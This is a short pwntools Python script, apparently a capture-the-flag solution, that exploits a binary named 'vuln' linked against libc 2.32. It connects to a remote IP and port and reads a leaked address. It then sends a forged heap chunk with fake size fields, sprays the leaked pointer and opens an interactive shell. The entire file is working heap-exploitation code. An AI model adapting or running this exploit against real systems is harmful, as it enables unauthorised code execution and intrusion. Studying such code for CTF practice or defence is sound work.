#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

def main():
    #r = conn()
    r = remote("161.97.176.150", 2929)
    r.recvuntil("[!]")
    r.recvline()
    leak = int(r.recvline().strip(), 16)
    pause()
    chunk  = p64(0) + p64(0x41)
    chunk += p8(0)*0x30
    chunk += p64(0) + p64(0x21)

    r.send(chunk)
    pause()
    r.send(p64(leak)*(0x400//8))

    r.interactive()


if __name__ == "__main__":
    main()
